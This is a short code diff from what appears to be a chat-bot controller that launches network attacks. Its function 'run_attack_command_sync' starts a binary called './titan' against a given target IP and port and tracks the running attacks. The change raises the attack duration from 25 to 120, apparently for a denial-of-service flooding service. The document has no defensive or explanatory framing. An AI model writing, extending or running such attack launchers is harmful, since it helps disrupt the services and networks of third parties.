@@ -92,7 +92,7 @@ def send_not_approved_message(chat_id):
 # Run attack command synchronously
 def run_attack_command_sync(target_ip, target_port, action):
     if action == 1:
-        process = subprocess.Popen(["./titan", target_ip, str(target_port), "25"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./titan", target_ip, str(target_port), "120"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[(target_ip, target_port)] = process
     elif action == 2:
         process = active_attacks.pop((target_ip, target_port), None)
